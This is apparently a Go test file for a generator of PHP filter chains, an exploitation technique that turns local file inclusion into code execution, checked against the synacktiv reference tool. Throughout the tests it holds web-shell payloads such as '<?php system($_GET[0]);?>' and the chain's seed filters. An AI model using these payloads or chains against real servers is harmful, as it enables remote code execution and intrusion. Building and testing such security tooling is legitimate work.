package phpfilter

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
)

// TestGenerateMatchesCanonicalReference pins the output for a known payload to
// the byte-for-byte result of synacktiv's php_filter_chain_generator
// (verified equal at authoring time). This guards the conversion table and the
// assembly algorithm against any regression: if the produced chain changes, the
// SHA-256 changes and this test fails loudly. The payload and hash were derived
// from the reference generator's --chain mode.
func TestGenerateMatchesCanonicalReference(t *testing.T) {
	const wantSHA = "5b208a1cfbd5257e5913bd8b505fe4dca4895938d0f8759c52eaf788813d32a5"
	chain, err := Generate("<?php system($_GET[0]);?>", "")
	if err != nil {
		t.Fatalf("Generate error: %v", err)
	}
	// The reference generator's stdout includes a trailing newline; our chain
	// does not, so hash the chain plus a newline to match the captured value.
	sum := sha256.Sum256([]byte(chain + "\n"))
	got := hex.EncodeToString(sum[:])
	if got != wantSHA {
		t.Errorf("canonical chain mismatch:\n got SHA %s\nwant SHA %s\nchain: %s", got, wantSHA, chain)
	}
}

func TestConversionTableCoversFullBase64Alphabet(t *testing.T) {
	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	for _, c := range []byte(alphabet) {
		conv, ok := conversions[c]
		if !ok {
			t.Errorf("missing conversion for base64 char %q", string(c))
			continue
		}
		if conv == "" {
			t.Errorf("empty conversion for base64 char %q (only '=' may be empty)", string(c))
		}
	}
	// Every conversion alphabet char appears; '=' maps to empty by design.
	if conversions['='] != "" {
		t.Errorf("'=' conversion should be empty, got %q", conversions['='])
	}
}

func TestGenerateStructure(t *testing.T) {
	chain, err := Generate("<?php phpinfo();?>", "")
	if err != nil {
		t.Fatalf("Generate returned error: %v", err)
	}
	if !strings.HasPrefix(chain, "php://filter/") {
		t.Errorf("chain missing php://filter/ prefix: %q", chain)
	}
	if !strings.HasSuffix(chain, "/resource=php://temp") {
		t.Errorf("chain missing default resource suffix: %q", chain)
	}
	// Seed must be present exactly once at the front.
	if !strings.Contains(chain, "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|") {
		t.Errorf("chain missing the garbage-base64 seed: %q", chain)
	}
	// Must terminate with a real decode so the sink receives raw bytes.
	if !strings.Contains(chain, "convert.base64-decode/resource=") {
		t.Errorf("chain missing terminal base64-decode: %q", chain)
	}
}

func TestGenerateDecodeGroupCountMatchesPayload(t *testing.T) {
	payload := "<?=`$_GET[0]`?>"
	chain, err := Generate(payload, "")
	if err != nil {
		t.Fatalf("Generate returned error: %v", err)
	}
	// One decode/encode/UTF7 cleanup group per non-padding base64 char, plus
	// the single seed encode. Count base64-decode occurrences: one per char
	// group + one terminal decode.
	b64 := strings.TrimRight(base64.StdEncoding.EncodeToString([]byte(payload)), "=")
	wantDecodes := len(b64) + 1 // per-char groups + terminal decode
	gotDecodes := strings.Count(chain, "convert.base64-decode")
	if gotDecodes != wantDecodes {
		t.Errorf("base64-decode count = %d, want %d (payload base64 len %d)", gotDecodes, wantDecodes, len(b64))
	}
	// UTF7 strip steps: one in seed + one per char group.
	wantUTF7 := len(b64) + 1
	gotUTF7 := strings.Count(chain, "convert.iconv.UTF8.UTF7")
	if gotUTF7 != wantUTF7 {
		t.Errorf("UTF8.UTF7 count = %d, want %d", gotUTF7, wantUTF7)
	}
}

func TestGenerateIsRightToLeft(t *testing.T) {
	// Use a payload whose base64 has two distinct leading/trailing chars so we
	// can assert ordering. base64("AB") = "QUI=" (Q,U,I). The chain builds
	// right-to-left, so the conversion for the LAST char ('I') is emitted
	// before the conversion for the FIRST char ('Q').
	chain, err := Generate("AB", "")
	if err != nil {
		t.Fatalf("Generate error: %v", err)
	}
	idxLast := strings.Index(chain, conversions['I'])
	idxFirst := strings.Index(chain, conversions['Q'])
	if idxLast == -1 || idxFirst == -1 {
		t.Fatalf("expected both conversions present: I=%d Q=%d", idxLast, idxFirst)
	}
	if idxLast >= idxFirst {
		t.Errorf("expected last char conversion before first char conversion (right-to-left); I at %d, Q at %d", idxLast, idxFirst)
	}
}

func TestGenerateDeterministic(t *testing.T) {
	a, err := Generate("system($_GET[0]);", "php://temp")
	if err != nil {
		t.Fatal(err)
	}
	b, err := Generate("system($_GET[0]);", "php://temp")
	if err != nil {
		t.Fatal(err)
	}
	if a != b {
		t.Error("Generate is not deterministic for identical input")
	}
}

func TestGenerateCustomResource(t *testing.T) {
	chain, err := Generate("x", "data://text/plain,foo")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(chain, "/resource=data://text/plain,foo") {
		t.Errorf("custom resource not honoured: %q", chain)
	}
}

func TestGenerateEmptyPayloadErrors(t *testing.T) {
	if _, err := Generate("", ""); err == nil {
		t.Error("expected error for empty payload, got nil")
	}
}

func TestGenerateFromBase64DebugMode(t *testing.T) {
	// decode=false (debug) must NOT end with a terminal decode; it ends at the
	// resource after the last cleanup group.
	chain, err := GenerateFromBase64("QUI=", "", false)
	if err != nil {
		t.Fatalf("GenerateFromBase64 error: %v", err)
	}
	if strings.Contains(chain, "convert.base64-decode/resource=") {
		t.Errorf("debug chain should not terminate in base64-decode: %q", chain)
	}
	if !strings.HasSuffix(chain, "/resource=php://temp") {
		t.Errorf("debug chain missing resource suffix: %q", chain)
	}
	// No empty "||" segments from trimming.
	if strings.Contains(chain, "||") {
		t.Errorf("debug chain has empty filter segment: %q", chain)
	}
}

func TestGenerateFromBase64Validation(t *testing.T) {
	cases := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{"valid", "QUJD", false},
		{"valid with padding", "QUI=", false},
		{"invalid chars", "not base64!", true},
		{"empty", "", true},
		{"only padding", "====", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := GenerateFromBase64(tc.input, "", true)
			if tc.wantErr && err == nil {
				t.Errorf("expected error for %q, got nil", tc.input)
			}
			if !tc.wantErr && err != nil {
				t.Errorf("unexpected error for %q: %v", tc.input, err)
			}
		})
	}
}

func TestNoEmptyFilterSegments(t *testing.T) {
	// Padding chars ('=') must not emit a bare "|convert.base64-decode" with a
	// leading empty conversion. Use a 1-byte payload whose base64 has padding.
	chain, err := Generate("a", "") // base64("a") = "YQ=="
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(chain, "||") {
		t.Errorf("chain contains empty filter segment: %q", chain)
	}
	if strings.Contains(chain, "/|") || strings.Contains(chain, "|/resource") {
		t.Errorf("chain has malformed filter boundary: %q", chain)
	}
}

func TestCharsExcludesPadding(t *testing.T) {
	for _, c := range Chars() {
		if c == '=' {
			t.Error("Chars() must not include '=' padding")
		}
	}
	if len(Chars()) != 64 {
		t.Errorf("Chars() returned %d chars, want 64", len(Chars()))
	}
}
